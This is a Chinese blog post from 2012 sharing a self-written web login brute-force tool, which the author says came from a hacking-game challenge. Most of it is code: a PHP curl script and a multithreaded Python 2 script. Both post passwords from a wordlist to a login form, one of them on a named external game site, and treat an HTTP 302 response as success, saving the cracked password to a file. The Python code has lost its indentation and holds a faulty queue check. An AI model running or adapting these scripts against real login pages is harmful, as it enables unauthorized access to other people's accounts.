title: "无验证码web爆破工具"
id: 68
date: 2012-07-01 13:15:26
tags: 
- 爆破
categories: 
- 原创作品
---

这个其实是前几天玩一个hackGame里面的题目，自己写的爆破工具

上代码：

##PHP版本

```php
<?php
set_time_limit(0);
$pwd = 'password/pwdt.txt'; //密码文件
$rhost = 'http://127.0.0.1/test/test.php'; //POST数据地址
$file = fopen($pwd, 'r');//初始化文件句柄
$curl = curl_init();//初始化

//设置参数

curl_setopt($curl, CURLOPT_URL, $rhost);//设置目标地址
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);//设置接收反馈内容
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_POST, 1);//设置提交方式为POST

while (!feof($file)){

 $fpwd = trim(fgets($file));

 $post_data = array('password'=&gt;$fpwd); //POST提交数据
 curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
 //执行提交内容
 curl_exec($curl);
 //获取状态反馈信息组
 $rsinfo = curl_getinfo($curl);
 if(intval($rsinfo['http_code'])== 302){
 file_put_contents('pwd.txt', $fpwd);
 echo '密码是：'.$fpwd.'已经保存到pwd.txt文件中';
 return ;
 }

}
//关闭资源接口
curl_close($curl);
//关闭文件句柄释放资源
fclose($file);
```
<!--more-->
---
##Python 模拟多线程版本：

```python
#/usr/bin python
# -*- coding: utf-8-*-
# create data:2012.6.20 By:Return

import httplib,urllib
import threading
import Queue
queue=Queue.Queue() #创建任务队列
class ThreadUrl(threading.Thread):
 def __init__(self,queue):
 threading.Thread.__init__(self)
 self.queue=queue
 def run(self):
 while True:
 try:
 if(Queue.Empty):
 pwd=self.queue.get() #从队列中获取密码
 else:
 break
 params = urllib.urlencode({'password':pwd}) #提交的数据

headers = {&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,

&quot;Connection&quot;:&quot;Keep-Alive&quot;}

#HTTP连接建立，连接地址为你要爆破的目标地址
 conn = httplib.HTTPConnection('game.creturn.net')
 # url参数为要爆破提交的POST地址
 conn.request(method=&quot;POST&quot;,url='/login.php',body=params,headers=headers)
 response = conn.getresponse()
 if response.status == 302:
 final=&quot;crack success!^_^! Password: %s&quot;%(pwd)
 fp = open('rs.txt','a+');
 fp.write(final); #如果破解成则忘文件rs.txt写入密码
 fp.close();
 else:
 conn.close();
 except:
 print 'connect time out!'
 self.queue.task_done()

def main():
 print 'Now is creaking....';
 for i in range(15):
 t=ThreadUrl(queue)
 t.setDaemon(True)
 t.start()
 pwds = open('pwd2.txt','r').readlines(); #读取密码文件
 for pwd in pwds:
 p=pwd
 queue.put(p)
 queue.join()
if __name__ == '__main__':
 main()
```
